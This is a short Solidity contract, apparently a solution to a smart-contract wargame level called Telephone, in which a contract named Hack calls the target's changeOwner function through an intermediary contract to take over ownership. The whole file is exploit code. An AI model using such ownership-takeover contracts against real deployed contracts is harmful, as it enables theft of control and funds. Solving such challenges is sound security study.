pragma solidity ^0.6.0;
// SPDX-License-Identifier: MIT


interface Telephone{
    function changeOwner(address _owner) external;
}

contract Hack{
    function attack(address _addr, address _owner) public{
        Telephone teleContract = Telephone(_addr);
    
        teleContract.changeOwner(_owner);
    
    }
}